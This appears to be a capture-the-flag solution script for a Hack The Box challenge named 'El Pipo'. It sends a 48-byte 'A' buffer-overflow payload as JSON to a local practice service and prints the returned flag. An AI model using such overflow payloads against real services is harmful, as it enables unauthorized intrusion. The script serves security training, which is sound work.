#!/bin/bash
# https://app.hackthebox.com/challenges/El%2520Pipo
# Tags: Buffer Overflow

TARGET="127.0.0.1:1337"
PAYLOAD=$(printf 'A%.0s' {1..48}) 
FLAG=$(curl -s http://$TARGET/process -H "Content-type: application/json" -d "{\"userInput\":\"$PAYLOAD\"}")

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"